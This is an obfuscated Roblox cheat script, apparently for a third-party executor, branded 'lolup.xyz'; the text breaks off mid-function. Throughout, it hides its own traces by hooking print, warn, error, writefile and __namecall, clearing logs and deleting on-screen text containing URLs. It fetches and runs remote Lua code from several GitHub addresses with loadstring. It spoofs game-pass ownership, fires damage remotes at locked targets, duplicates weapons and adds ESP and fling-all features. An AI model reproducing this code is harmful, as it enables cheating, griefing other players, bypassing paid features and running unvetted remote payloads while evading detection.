--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.14) ~  Much Love, Ferib 

]]--

local TABLE_TableIndirection = {};
function is_whitelisted(player)
	TABLE_TableIndirection["whitelist%0"] = {356312105};
	for _, nameOrID in pairs(TABLE_TableIndirection["whitelist%0"]) do
		if ((player.Name == nameOrID) or (player.UserId == nameOrID)) then
			return true;
		end
	end
	return false;
end
function is_blacklisted(player)
	TABLE_TableIndirection["blacklist%0"] = {"BoyBoy123",1223464556,"Player2"};
	for _, nameOrID in pairs(TABLE_TableIndirection["blacklist%0"]) do
		if ((player.Name == nameOrID) or (player.UserId == nameOrID)) then
			return true;
		end
	end
	return false;
end
TABLE_TableIndirection["player%0"] = game.Players.LocalPlayer;
if is_whitelisted(TABLE_TableIndirection["player%0"]) then
	TABLE_TableIndirection["dupping%0"] = false;
	TABLE_TableIndirection["walkSpeed%0"] = 16;
	TABLE_TableIndirection["plrs%0"] = game("Players");
	TABLE_TableIndirection["plr%0"] = TABLE_TableIndirection["plrs%0"].LocalPlayer;
	TABLE_TableIndirection["mouse%0"] = TABLE_TableIndirection["plr%0"]:GetMouse();
	TABLE_TableIndirection["rep%0"] = game("ReplicatedStorage");
	TABLE_TableIndirection["uis%0"] = game("UserInputService");
	TABLE_TableIndirection["ts%0"] = game("TweenService");
	TABLE_TableIndirection["rs%0"] = game("RunService");
	TABLE_TableIndirection["Player%0"] = game:GetService("Players").LocalPlayer;
	TABLE_TableIndirection["Mouse%0"] = TABLE_TableIndirection["Player%0"]:GetMouse();
	TABLE_TableIndirection["day%0"] = os.date("%d");
	TABLE_TableIndirection["month%0"] = os.date("%B");
	TABLE_TableIndirection["dd4%0"] = " ";
	TABLE_TableIndirection["djdsd%0"] = "th";
	TABLE_TableIndirection["year%0"] = os.date("%Y");
	local function GetChar()
		TABLE_TableIndirection["Char%0"] = TABLE_TableIndirection["Player%0"].Character or TABLE_TableIndirection["Player%0"].CharacterAdded:Wait();
		return TABLE_TableIndirection["Char%0"];
	end
	spawn(function()
		while true do
			TABLE_TableIndirection["rs%0"].RenderStepped:wait();
			pcall(function()
				if not TABLE_TableIndirection["uis%0"]:IsKeyDown(Enum.KeyCode.LeftShift) then
					TABLE_TableIndirection["plr%0"].Character.Humanoid.WalkSpeed = TABLE_TableIndirection["walkSpeed%0"];
				elseif TABLE_TableIndirection["uis%0"]:IsKeyDown(Enum.KeyCode.LeftShift) then
					TABLE_TableIndirection["plr%0"].Character.Humanoid.WalkSpeed = TABLE_TableIndirection["walkSpeed%0"] + 4;
				end
			end);
		end
	end);
	local function Notify(title, text, duration)
		game("StarterGui"):SetCore("SendNotification", {Title=tostring(title),Text=tostring(text),Duration=tonumber(duration)});
	end
	local function AddCd(tool, Cd)
		TABLE_TableIndirection["cd%0"] = Instance.new("IntValue", tool);
		TABLE_TableIndirection["cd%0"].Name = "ClientCD";
		game.Debris:AddItem(TABLE_TableIndirection["cd%0"], Cd);
	end
	local function Shoot(firstPos, nextPos, Revolver)
		if (Revolver("Barrel") and Revolver.Barrel("Attachment")) then
			if Revolver.Barrel.Attachment("Sound") then
				TABLE_TableIndirection["SoundClone%0"] = Revolver.Barrel.Attachment.Sound:Clone();
				TABLE_TableIndirection["SoundClone%0"].Name = "Uncopy";
				TABLE_TableIndirection["SoundClone%0"].Parent = Revolver.Barrel.Attachment;
				TABLE_TableIndirection["SoundClone%0"]:Play();
				game.Debris:AddItem(TABLE_TableIndirection["SoundClone%0"], 1);
			end
			TABLE_TableIndirection["FilterTable%0"] = {};
			table.insert(TABLE_TableIndirection["FilterTable%0"], TABLE_TableIndirection["plr%0"].Character);
			table.insert(TABLE_TableIndirection["FilterTable%0"], game.Workspace["Target Filter"]);
			for _, v in pairs(game.Workspace:GetDescendants()) do
				if (v.ClassName == "Accessory") then
					table.insert(TABLE_TableIndirection["FilterTable%0"], v);
				end
			end
			local a_1, a_2, a_3 = game.Workspace:FindPartOnRayWithIgnoreList(Ray.new(firstPos, (nextPos - firstPos).Unit * 100), TABLE_TableIndirection["FilterTable%0"]);
			TABLE_TableIndirection["BulletCl%0"] = TABLE_TableIndirection["rep%0"]["Revolver Bullet"]:Clone();
			game.Debris:AddItem(TABLE_TableIndirection["BulletCl%0"], 1);
			TABLE_TableIndirection["BulletCl%0"].Parent = game.Workspace["Target Filter"];
			TABLE_TableIndirection["mg%0"] = (firstPos - a_2).Magnitude;
			TABLE_TableIndirection["BulletCl%0"].Size = Vector3.new(0.2, 0.2, TABLE_TableIndirection["mg%0"]);
			TABLE_TableIndirection["BulletCl%0"].CFrame = CFrame.new(firstPos, nextPos) * CFrame.new(0, 0, -TABLE_TableIndirection["mg%0"] / 2);
			TABLE_TableIndirection["ts%0"]:Create(TABLE_TableIndirection["BulletCl%0"], TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size=Vector3.new(0.05, 0.05, TABLE_TableIndirection["mg%0"]),Transparency=1}):Destroy();
			if a_1 then
				TABLE_TableIndirection["expPart%0"] = Instance.new("Part");
				game.Debris:AddItem(TABLE_TableIndirection["expPart%0"], 2);
				TABLE_TableIndirection["expPart%0"].Name = "Exploding Neon Part";
				TABLE_TableIndirection["expPart%0"].Anchored = true;
				TABLE_TableIndirection["expPart%0"].CanCollide = false;
				TABLE_TableIndirection["expPart%0"].Shape = "Ball";
				TABLE_TableIndirection["expPart%0"].Material = Enum.Material.Neon;
				TABLE_TableIndirection["expPart%0"].BrickColor = TABLE_TableIndirection["BulletCl%0"].BrickColor;
				TABLE_TableIndirection["expPart%0"].Size = Vector3.new(0.1, 0.1, 0.1);
				TABLE_TableIndirection["expPart%0"].Parent = game.Workspace["Target Filter"];
				TABLE_TableIndirection["expPart%0"].Position = a_2;
				TABLE_TableIndirection["ts%0"]:Create(TABLE_TableIndirection["expPart%0"], TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size=Vector3.new(2, 2, 2),Transparency=1}):Play();
				if (Revolver("DamageRemote") and a_1.Parent("Humanoid")) then
					Revolver.DamageRemote:FireServer(a_1.Parent.Humanoid);
				end
			end
		end
	end
	hookfunction(print, function(...)
		return;
	end);
	hookfunction(warn, function(...)
		return;
	end);
	hookfunction(error, function(...)
		return;
	end);
	TABLE_TableIndirection["oldwrite%0"] = nil;
	oldwrite = hookfunction(writefile, function(file, content)
		if (string.find(string.lower(content), "https://")) then
			return;
		end
		return TABLE_TableIndirection["oldwrite%0"](file, content);
	end);
	game.DescendantAdded:Connect(function(c)
		if ((c and c:IsA("TextLabel")) or c:IsA("TextButton") or c:IsA("Message")) then
			if string.find(string.lower(c.Text), "https://") then
				c:Destroy();
			end
		end
	end);
	getgenv().rconsoletitle = nil;
	getgenv().rconsoleprint = nil;
	getgenv().rconsolewarn = nil;
	getgenv().rconsoleinfo = nil;
	getgenv().rconsolerr = nil;
	getrenv().print = function(...)
		return;
	end;
	getrenv().warn = function(...)
		return;
	end;
	getrenv().error = function(...)
		return;
	end;
	getgenv().print = function(...)
		return;
	end;
	getgenv().warn = function(...)
		return;
	end;
	getgenv().error = function(...)
		return;
	end;
	getgenv().clonefunction = function(...)
		return;
	end;
	game.CoreGui.ChildAdded:Connect(function(c)
		if (string.lower(c.Name) == "devconsolemaster") then
			c.DescendantAdded:Connect(function(x)
				if (x:IsA("TextLabel") or x:IsA("TextButton")) then
					if string.find(string.lower(x.Text), "https://") then
						x:Destroy();
					end
				end
			end);
		end
	end);
	TABLE_TableIndirection["oldNamecall%0"] = nil;
	oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
		TABLE_TableIndirection["method%0"] = getnamecallmethod();
		if (string.lower(TABLE_TableIndirection["method%0"]) == "rconsoleprint") then
			return task.wait(8999999488);
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "rconsoleinfo") then
			return task.wait(8999999488);
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "rconsolewarn") then
			return task.wait(8999999488);
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "rconsoleerr") then
			return task.wait(8999999488);
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "print") then
			return;
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "warn") then
			return;
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "error") then
			return;
		end
		if (string.lower(TABLE_TableIndirection["method%0"]) == "rendernametag") then
			return;
		end
		return TABLE_TableIndirection["oldNamecall%0"](self, ...);
	end));
	task.spawn(function()
		game:GetService("RunService").RenderStepped:Connect(function()
			game:GetService("LogService"):ClearOutput();
		end);
	end);
	TABLE_TableIndirection["Library%0"] = loadstring(game:HttpGet("https://raw.githubusercontent.com/Devel0perzzz/main/main/lib"))();
	TABLE_TableIndirection["Window%0"] = TABLE_TableIndirection["Library%0"]:CreateWindow("lolup.xyz", Vector2.new(492, 598), Enum.KeyCode.F1);
	TABLE_TableIndirection["Tab1%0"] = TABLE_TableIndirection["Window%0"]:CreateTab("L0ck");
	TABLE_TableIndirection["plr%0"]:GetMouse().KeyDown:Connect(function(key)
		if (key == "r") then
			tar = nil;
			for _, v in next, workspace:GetDescendants() do
				if (v.Name == "SelectedPlayer") then
					v:Destroy();
				end
			end
			local n_plr, dist;
			for _, v in pairs(game.Players:GetPlayers()) do
				if ((v ~= TABLE_TableIndirection["plr%0"]) and TABLE_TableIndirection["plr%0"].Character and TABLE_TableIndirection["plr%0"].Character("HumanoidRootPart")) then
					TABLE_TableIndirection["distance%0"] = v:DistanceFromCharacter(TABLE_TableIndirection["plr%0"].Character.HumanoidRootPart.Position);
					if (v.Character and (not dist or (TABLE_TableIndirection["distance%0"] <= dist)) and v.Character("Humanoid") and (v.Character("Humanoid").Health > 0) and v.Character("HumanoidRootPart")) then
						dist = TABLE_TableIndirection["distance%0"];
						n_plr = v;
					end
				end
			end
			TABLE_TableIndirection["sp%0"] = Instance.new("SelectionBox", n_plr.Character.HumanoidRootPart);
			TABLE_TableIndirection["sp%0"].Name = "SelectedPlayer";
			TABLE_TableIndirection["sp%0"].Adornee = n_plr.Character.HumanoidRootPart;
			tar = n_plr;
		elseif ((key == "q") and tar and TABLE_TableIndirection["plr%0"].Character) then
			for _, v in next, TABLE_TableIndirection["plr%0"].Character:GetDescendants() do
				if (v("Tool") and (v.Name ~= "Kawaii Revolver") and not v("ClientCD") and v("DamageRemote") and v("Cooldown") and tar and tar.Character and tar.Character("Humanoid")) then
					AddCd(v, v.Cooldown.Value);
					v.DamageRemote:FireServer(tar.Character("Humanoid"));
					if (v("Attack") and TABLE_TableIndirection["plr%0"].Character("Humanoid")) then
						TABLE_TableIndirection["plr%0"].Character("Humanoid"):LoadAnimation(v.Attack):Play();
					end
					if v("Blade") then
						for _, x in next, v.Blade:GetChildren() do
							if x("Sound") then
								x:Play();
							end
						end
					end
				elseif (v("Tool") and (v.Name == "Kawaii Revolver") and not v("ClientCD") and v("ReplicateRemote") and v("Barrel") and v.Barrel("Attachment") and tar and tar.Character and tar.Character("HumanoidRootPart")) then
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					AddCd(v, 2);
					TABLE_TableIndirection["rs%0"].Stepped:wait();
					Shoot(v.Barrel.Attachment.WorldPosition, tar.Character.HumanoidRootPart.Position, v);
					v.ReplicateRemote:FireServer(tar.Character.HumanoidRootPart.Position);
				end
			end
		elseif (key == "v") then
			for _, v in next, TABLE_TableIndirection["plr%0"].Backpack:GetChildren() do
				if (TABLE_TableIndirection["plr%0"].Character and TABLE_TableIndirection["plr%0"].Character("Torso") and (v.Name == "Kawaii Revolver") and v("ReplicateRemote") and not v("ClientCD") and v("Barrel") and v.Barrel("Attachment")) then
					AddCd(v, 2);
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					Shoot(v.Barrel.Attachment.WorldPosition, TABLE_TableIndirection["mouse%0"].Hit.p, v);
					v.ReplicateRemote:FireServer(TABLE_TableIndirection["mouse%0"].Hit.p);
					v:Activate();
					TABLE_TableIndirection["rs%0"].Stepped:wait();
					v.Parent = TABLE_TableIndirection["plr%0"].Backpack;
				end
			end
		elseif ((key == "c") and TABLE_TableIndirection["plr%0"]("Backpack")) then
			TABLE_TableIndirection["guns%0"] = 0;
			for _, v in next, TABLE_TableIndirection["plr%0"].Backpack:GetChildren() do
				if ((TABLE_TableIndirection["guns%0"] <= 10) and TABLE_TableIndirection["plr%0"].Character and TABLE_TableIndirection["plr%0"].Character("Head") and (v.Name == "Kawaii Revolver") and not v("ClientCD") and v("ReplicateRemote") and v("Barrel") and v.Barrel("Attachment")) then
					TABLE_TableIndirection["guns%0"] = TABLE_TableIndirection["guns%0"] + 1;
					AddCd(v, 2);
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					Shoot(TABLE_TableIndirection["plr%0"].Character.Head.Position, TABLE_TableIndirection["mouse%0"].Hit.p, v);
					v.ReplicateRemote:FireServer(TABLE_TableIndirection["mouse%0"].Hit.p);
					v.Parent = TABLE_TableIndirection["plr%0"].Backpack;
				end
			end
		elseif (key == "n") then
			for i, v in next, TABLE_TableIndirection["plr%0"].Backpack:GetChildren() do
				if (v.Name == "Spiked Trap") then
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					v:Activate();
					wait();
					v.Parent = TABLE_TableIndirection["plr%0"].Backpack;
				end
			end
		elseif (key == "z") then
			for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if (v.Name == "Chainsaw") then
					game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
					for i = 1, 2 do
						game:GetService("RunService").Heartbeat:Wait();
					end
				end
			end
		elseif (key == "k") then
			for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if (v.Name == "Chainsaw") then
					game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
					v:Activate();
					wait(0.1);
					for i = 1, 2 do
						game:GetService("RunService").Heartbeat:Wait();
					end
				end
			end
		elseif (key == "x") then
			for i, v in next, TABLE_TableIndirection["plr%0"].Backpack:GetChildren() do
				if ((v.Name == "Grenade") and v("RemoteEvent")) then
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					v.RemoteEvent:FireServer(TABLE_TableIndirection["mouse%0"].Hit.LookVector);
					wait();
					v.Parent = TABLE_TableIndirection["plr%0"].Backpack;
				end
			end
		elseif (key == "b") then
			for i, v in next, TABLE_TableIndirection["plr%0"].Backpack:GetChildren() do
				if ((v.Name == "C4") or ("Grenade" and v("RemoteEvent"))) then
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					v.RemoteEvent:FireServer(TABLE_TableIndirection["mouse%0"].Hit.LookVector);
					wait();
					v.Parent = TABLE_TableIndirection["plr%0"].Backpack;
				end
			end
		elseif (key == "p") then
			for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if ((v.Name == "C4") or ("Grenade" and v("RemoteEvent"))) then
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					v.RemoteEvent:FireServer();
					for i = 1, 2 do
						game:GetService("RunService").Heartbeat:Wait();
					end
				end
			end
		elseif (key == "u") then
			for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if ((v.Name == "C4") or ("Grenade" and v("RemoteEvent"))) then
					v.Parent = TABLE_TableIndirection["plr%0"].Character;
					v.RemoteEvent:FireServer(TABLE_TableIndirection["mouse%0"].Hit);
					game.Players.LocalPlayer.Character.Humanoid:EquipTool(v);
					Workspace.HelloJesus009.C4.RemoteEvent:FireServer(TABLE_TableIndirection["mouse%0"].Hit);
					game:GetService("RunService").Heartbeat:Wait();
				end
			end
		elseif ((key == "l") and TABLE_TableIndirection["plr%0"].Character) then
			if not TABLE_TableIndirection["dupping%0"] then
				Notify("Ready", "Wait 5 Sec", 0);
				spawn(function()
					TABLE_TableIndirection["dupping%0"] = true;
					TABLE_TableIndirection["c%0"] = 1;
					for i = 1, 60 do
						pcall(function()
							if (TABLE_TableIndirection["c%0"] > #TABLE_TableIndirection["rep%0"].Weapons:GetChildren()) then
								TABLE_TableIndirection["c%0"] = 1;
							end
						end);
						for _, v in next, TABLE_TableIndirection["plr%0"].Character:GetChildren() do
							if ((v.Name == "Loaded") and v("IntValue")) then
								v:Destroy();
							end
						end
						for _, v in next, TABLE_TableIndirection["plr%0"].PlayerGui:GetDescendants() do
							if (v("RemoteEvent") and (v.Name == "RemoteEvent")) then
								pcall(function()
									v:FireServer(TABLE_TableIndirection["rep%0"].Weapons:GetChildren()[TABLE_TableIndirection["c%0"]].Name);
									TABLE_TableIndirection["c%0"] = TABLE_TableIndirection["c%0"] + 1;
								end);
							end
						end
						wait(0);
					end
					Notify("Lolup.xyz", ".gg/enelm", 0);
					TABLE_TableIndirection["dupping%0"] = false;
				end);
			else
				Notify("Lolup.xyz", "Tu viejaaaa", 0);
			end
		end
	end);
	TABLE_TableIndirection["Old%0"] = nil;
	Old = hookmetamethod(game, "__namecall", function(...)
		if (not checkcaller() and (getnamecallmethod() == "UserOwnsGamePassAsync")) then
			return true;
		end
		return TABLE_TableIndirection["Old%0"](...);
	end);
	TABLE_TableIndirection["watermark%0"] = TABLE_TableIndirection["Library%0"]:CreateWatermark("Lolup.xyz | {fps} | v1.0 | Beta");
	TABLE_TableIndirection["watermark%0"].Visible = true;
	TABLE_TableIndirection["MainSS1%0"] = TABLE_TableIndirection["Tab1%0"]:CreateSector("Visual", "left");
	writefile("paimon.webm", game:HttpGet("https://github.com/Storm99999/whitelistkeys/blob/main/paimon.webm?raw=true"));
	TABLE_TableIndirection["arsonfuncs%0"] = {};
	TABLE_TableIndirection["current_guns%0"] = {};
	TABLE_TableIndirection["Skyboxes%0"] = {["Purple Nebula"]={SkyboxBk="rbxassetid://159454299",SkyboxDn="rbxassetid://159454296",SkyboxFt="rbxassetid://159454293",SkyboxLf="rbxassetid://159454286",SkyboxRt="rbxassetid://159454300",SkyboxUp="rbxassetid://159454288"},["Night Sky"]={SkyboxBk="rbxassetid://12064107",SkyboxDn="rbxassetid://12064152",SkyboxFt="rbxassetid://12064121",SkyboxLf="rbxassetid://12063984",SkyboxRt="rbxassetid://12064115",SkyboxUp="rbxassetid://12064131"},["Pink Daylight"]={SkyboxBk="rbxassetid://271042516",SkyboxDn="rbxassetid://271077243",SkyboxFt="rbxassetid://271042556",SkyboxLf="rbxassetid://271042310",SkyboxRt="rbxassetid://271042467",SkyboxUp="rbxassetid://271077958"},["Morning Glow"]={SkyboxBk="rbxassetid://1417494030",SkyboxDn="rbxassetid://1417494146",SkyboxFt="rbxassetid://1417494253",SkyboxLf="rbxassetid://1417494402",SkyboxRt="rbxassetid://1417494499",SkyboxUp="rbxassetid://1417494643"},["Setting Sun"]={SkyboxBk="rbxassetid://626460377",SkyboxDn="rbxassetid://626460216",SkyboxFt="rbxassetid://626460513",SkyboxLf="rbxassetid://626473032",SkyboxRt="rbxassetid://626458639",SkyboxUp="rbxassetid://626460625"},["Fade Blue"]={SkyboxBk="rbxassetid://153695414",SkyboxDn="rbxassetid://153695352",SkyboxFt="rbxassetid://153695452",SkyboxLf="rbxassetid://153695320",SkyboxRt="rbxassetid://153695383",SkyboxUp="rbxassetid://153695471"},["Elegant Morning"]={SkyboxBk="rbxassetid://153767241",SkyboxDn="rbxassetid://153767216",SkyboxFt="rbxassetid://153767266",SkyboxLf="rbxassetid://153767200",SkyboxRt="rbxassetid://153767231",SkyboxUp="rbxassetid://153767288"},Neptune={SkyboxBk="rbxassetid://218955819",SkyboxDn="rbxassetid://218953419",SkyboxFt="rbxassetid://218954524",SkyboxLf="rbxassetid://218958493",SkyboxRt="rbxassetid://218957134",SkyboxUp="rbxassetid://218950090"},["Aesthetic Night"]={SkyboxBk="rbxassetid://1045964490",SkyboxDn="rbxassetid://1045964368",SkyboxFt="rbxassetid://1045964655",SkyboxLf="rbxassetid://1045964655",SkyboxRt="rbxassetid://1045964655",SkyboxUp="rbxassetid://1045962969"},Floppa={SkyboxBk="rbxassetid://6787971998",SkyboxDn="rbxassetid://6787971998",SkyboxFt="rbxassetid://6787971998",SkyboxLf="rbxassetid://6787971998",SkyboxRt="rbxassetid://6787971998",SkyboxUp="rbxassetid://6787971998"},Furry={SkyboxBk="rbxassetid://12497888921",SkyboxDn="rbxassetid://12497888921",SkyboxFt="rbxassetid://12497888921",SkyboxLf="rbxassetid://12497888921",SkyboxRt="rbxassetid://12497888921",SkyboxUp="rbxassetid://12497888921"},["ALL Violet"]={SkyboxBk="rbxassetid://163143622",SkyboxDn="rbxassetid://163143622",SkyboxFt="rbxassetid://163143622",SkyboxLf="rbxassetid://163143622",SkyboxRt="rbxassetid://163143622",SkyboxUp="rbxassetid://163143622"},["Kanye West"]={SkyboxBk="rbxassetid://10639466116",SkyboxDn="rbxassetid://10639466116",SkyboxFt="rbxassetid://10639466116",SkyboxLf="rbxassetid://10639466116",SkyboxRt="rbxassetid://10639466116",SkyboxUp="rbxassetid://10639466116"},["HL Last Coast"]={SkyboxBk="rbxassetid://8982470493",SkyboxDn="rbxassetid://8982469840",SkyboxFt="rbxassetid://8982469496",SkyboxLf="rbxassetid://8982468913",SkyboxRt="rbxassetid://8982462149",SkyboxUp="rbxassetid://8982461833"}};
	TABLE_TableIndirection["MainSS1%0"]:AddToggle("Custom Skybox", false, function(x)
		sky = x;
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddDropdown("Skybox", {"Purple Nebula","Night Sky","Pink Daylight","Morning Glow","Setting Sun","Fade Blue","Elegant Morning","Neptune","Redshift","Aesthetic Night","HL Last Coast","Floppa","Furry","All Violet","Kanye West"}, "Purple Nebula", false, function(x)
		if not sky then
			return;
		end
		if game.Lighting:FindFirstChildOfClass("Sky") then
			game.Lighting:FindFirstChildOfClass("Sky"):Destroy();
		end
		TABLE_TableIndirection["skybox%0"] = Instance.new("Sky", game.Lighting);
		TABLE_TableIndirection["skybox%0"].SkyboxLf = TABLE_TableIndirection["Skyboxes%0"][x].SkyboxLf;
		TABLE_TableIndirection["skybox%0"].SkyboxBk = TABLE_TableIndirection["Skyboxes%0"][x].SkyboxBk;
		TABLE_TableIndirection["skybox%0"].SkyboxDn = TABLE_TableIndirection["Skyboxes%0"][x].SkyboxDn;
		TABLE_TableIndirection["skybox%0"].SkyboxFt = TABLE_TableIndirection["Skyboxes%0"][x].SkyboxFt;
		TABLE_TableIndirection["skybox%0"].SkyboxRt = TABLE_TableIndirection["Skyboxes%0"][x].SkyboxRt;
		TABLE_TableIndirection["skybox%0"].SkyboxUp = TABLE_TableIndirection["Skyboxes%0"][x].SkyboxUp;
		TABLE_TableIndirection["skybox%0"].Name = "override";
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddButton("Minecraft Map", function(x)
		TABLE_TableIndirection["faces%0"] = {"Front","Back","Bottom","Top","Right","Left"};
		TABLE_TableIndirection["materials%0"] = {{"Wood","3258599312"},{"WoodPlanks","8676581022"},{"Brick","8558400252"},{"Cobblestone","5003953441"},{"Concrete","7341687607"},{"DiamondPlate","6849247561"},{"Fabric","118776397"},{"Granite","4722586771"},{"Grass","4722588177"},{"Ice","3823766459"},{"Marble","62967586"},{"Metal","62967586"},{"Sand","152572215"}};
		function decal(ins, id)
			for _, v in pairs(TABLE_TableIndirection["faces%0"]) do
				TABLE_TableIndirection["texture%0"] = Instance.new("Decal", ins);
				TABLE_TableIndirection["texture%0"].ZIndex = 2147483647;
				TABLE_TableIndirection["texture%0"].Texture = "rbxassetid://" .. id;
				TABLE_TableIndirection["texture%0"].Face = Enum.NormalId[v];
				TABLE_TableIndirection["texture%0"].Color3 = ins.Color;
				TABLE_TableIndirection["texture%0"].Transparency = ins.Transparency;
			end
		end
		for _, part in pairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				for _, v in pairs(TABLE_TableIndirection["materials%0"]) do
					if (part.Material.Name == v[1]) then
						decal(part, v[2]);
						part.Material = "SmoothPlastic";
					end
				end
			end
		end
		workspace.ChildAdded:Connect(function(c)
			if (c.Name == "Map") then
				task.wait(4.5);
				for _, part in pairs(workspace:GetDescendants()) do
					if part:IsA("BasePart") then
						for _, v in pairs(TABLE_TableIndirection["materials%0"]) do
							if (part.Material.Name == v[1]) then
								decal(part, v[2]);
								part.Material = "SmoothPlastic";
							end
						end
					end
				end
			end
		end);
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddSlider("Fov", 0, 70, 120, 1, function(x)
		workspace.CurrentCamera.FieldOfView = x;
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddSlider("Brigtness", 0, 2, 20, 2, function(x)
		game:GetService("Lighting").Brightness = x;
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddSlider("Fog", 1, 2000, 2000, 1000, function(x)
		game:GetService("Lighting").FogEnd = x;
	end);
	TABLE_TableIndirection["ColorToggle%0"] = TABLE_TableIndirection["MainSS1%0"]:AddToggle("Ambient Color", false, function(e)
	end);
	TABLE_TableIndirection["ColorToggle%0"]:AddColorpicker(Color3.fromRGB(75, 0, 130), function(ztx)
		game:GetService("Lighting").FogColor = ztx;
	end);
	TABLE_TableIndirection["Sense%0"] = loadstring(game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/lib/sense4aimhook.lua"))();
	TABLE_TableIndirection["MainSS1%0"]:AddToggle("Toggle Watermark", false, function(x)
		TABLE_TableIndirection["watermark%0"].Visible = x;
	end);
	TABLE_TableIndirection["Sense%0"].teamSettings.enemy.enabled = true;
	TABLE_TableIndirection["Sense%0"].teamSettings.enemy.box = true;
	TABLE_TableIndirection["Sense%0"].teamSettings.enemy.boxColor[1] = Color3.fromRGB(255, 0, 255);
	TABLE_TableIndirection["yhh%0"] = TABLE_TableIndirection["MainSS1%0"]:AddToggle("Enable ESP", false, function(x)
		if x then
			TABLE_TableIndirection["Sense%0"].Load();
		else
			TABLE_TableIndirection["Sense%0"].Unload();
		end
	end);
	TABLE_TableIndirection["yhh%0"]:AddColorpicker(Color3.fromRGB(255, 0, 255), function(x)
		cSense.teamSettings.enemy.boxColor[1] = x;
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddToggle("Show Health", false, function(x)
		TABLE_TableIndirection["Sense%0"].teamSettings.enemy.healthBar = x;
	end);
	TABLE_TableIndirection["ya%0"] = TABLE_TableIndirection["MainSS1%0"]:AddToggle("Better Name ESP", false, function(x)
		TABLE_TableIndirection["Sense%0"].teamSettings.enemy.name = x;
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddToggle("Show Distance", false, function(x)
		TABLE_TableIndirection["Sense%0"].teamSettings.enemy.distance = x;
	end);
	TABLE_TableIndirection["MainSS1%0"]:AddToggle("Offscreen Arrows", false, function(x)
		TABLE_TableIndirection["Sense%0"].teamSettings.enemy.offScreenArrow = x;
	end);
	TABLE_TableIndirection["MainSS2%0"] = TABLE_TableIndirection["Tab1%0"]:CreateSector("User", "right");
	TABLE_TableIndirection["MainSS2%0"]:AddButton("Fling GUI", function(IhateGayPeople)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt", true))();
	end);
	TABLE_TableIndirection["ColorToggle%1"] = TABLE_TableIndirection["MainSS2%0"]:AddToggle("Revolver Bullet", false, function(x)
		game:GetService("ReplicatedStorage")["Revolver Bullet"].Color = x;
	end);
	TABLE_TableIndirection["ColorToggle%1"]:AddColorpicker(Color3.fromRGB(75, 0, 130), function(ztx)
		game:GetService("ReplicatedStorage")["Revolver Bullet"].Color = ztx;
	end);
	TABLE_TableIndirection["MainSS2%0"]:AddButton("Fling All", function(IhateGayPeople)
		TABLE_TableIndirection["Targets%0"] = {"All"};
		TABLE_TableIndirection["Players%0"] = game:GetService("Players");
		TABLE_TableIndirection["Player%1"] = TABLE_TableIndirection["Players%0"].LocalPlayer;
		TABLE_TableIndirection["AllBool%0"] = false;
		local GetPlayer = function(Name)
			Name = Name:lower();
			if ((Name == "all") or (Name == "others")) then
				TABLE_TableIndirection["AllBool%0"] = true;
				return;
			elseif (Name == "random") then
				TABLE_TableIndirection["GetPlayers%0"] = TABLE_TableIndirection["Players%0"]:GetPlayers();
				if table.find(TABLE_TableIndirection["GetPlayers%0"], TABLE_TableIndirection["Player%1"]) then
					table.remove(TABLE_TableIndirection["GetPlayers%0"], table.find(TABLE_TableIndirection["GetPlayers%0"], TABLE_TableIndirection["Player%1"]));
				end
				return TABLE_TableIndirection["GetPlayers%0"][math.random(#TABLE_TableIndirection["GetPlayers%0"])];
			elseif ((Name ~= "random") and (Name ~= "all") and (Name ~= "others")) then
				for _, x in next, TABLE_TableIndirection["Players%0"]:GetPlayers() do
					if (x ~= TABLE_TableIndirection["Player%1"]) then
						if x.Name:lower():match("^" .. Name) then
							return x;
						elseif x.DisplayName:lower():match("^" .. Name) then
							return x;
						end
					end
				end
			else
				return;
			end
		end;
		local Message = function(_Title, _Text, Time)
			game:GetService("StarterGui"):SetCore("SendNotification", {Title=_Title,Text=_Text,Duration=Time});
		end;
		local SkidFling = function(TargetPlayer)
			TABLE_TableIndirection["Character%0"] = TABLE_TableIndirection["Player%1"].Character;
